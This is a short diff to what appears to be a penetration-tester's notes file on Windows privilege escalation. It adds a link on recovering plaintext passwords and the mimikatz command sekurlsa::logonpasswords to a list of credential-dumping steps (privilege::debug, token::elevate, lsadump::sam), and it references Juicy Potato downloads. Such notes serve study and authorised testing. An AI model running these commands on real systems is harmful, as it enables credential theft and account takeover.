@@ -419,9 +419,11 @@ Pattern
             4.2.3.2 Auto
                 Gain admin priviliege
                 Run mimikatz
+                  http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/
                     privilege::debug
                     token::elevate
                     lsadump::sam
+                    sekurlsa::logonpasswords
       4.2.4 Juicy Potato   - Golden privilege
             https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
             https://github.com/ivanitlearning/Juicy-Potato-x86/releases for x86
